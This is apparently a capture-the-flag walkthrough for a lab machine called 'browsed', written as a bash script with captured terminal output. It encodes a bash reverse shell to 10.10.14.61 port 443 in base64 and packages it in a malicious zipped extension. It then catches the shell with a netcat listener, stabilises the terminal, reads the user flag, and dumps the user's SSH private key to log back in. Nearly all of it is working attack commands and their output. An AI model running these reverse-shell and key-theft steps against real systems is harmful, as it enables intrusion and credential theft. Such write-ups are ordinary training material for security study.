#! /bin/bash
# create a base64-encoded bash reverse shell back to my host
echo 'bash  -i >& /dev/tcp/10.10.14.61/443  0>&1  ' | base64 
# YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvNDQzICAwPiYxICA


# zip the malicious extension and start listening
zip -r ../shell.zip *


nc -lnvp 443

larry@browsed:~/markdownPreview$

larry@browsed:~/markdownPreview$ script /dev/null -c bash 
script /dev/null -c bash
Script started, output log file is '/dev/null'.
larry@browsed:~/markdownPreview$ ^Z
[1]+  Stopped                 nc -lnvp 443

stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
larry@browsed:~/markdownPreview$
larry@browsed:~$ cat user.txt

# There’s an SSH keypair in larry’s home directory. The public key is already in larry’s authorized_keys file:
larry@browsed:~/.ssh$ cat id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINlkhk8FEXwXNCOe06dt3BiJIti0nZWQHBABLy8gq3Ov larry@browsed
larry@browsed:~/.ssh$ cat authorized_keys 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINlkhk8FEXwXNCOe06dt3BiJIti0nZWQHBABLy8gq3Ov larry@browsed

# grab the private key as a save point:
larry@browsed:~/.ssh$ cat id_ed25519
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
#...[snip]...
#Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
#-----END OPENSSH PRIVATE KEY-----

# Connect SSH

ssh -i ~/keys/browsed-larry larry@10.129.3.225
#Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)
#...[snip]...
larry@browsed:~$

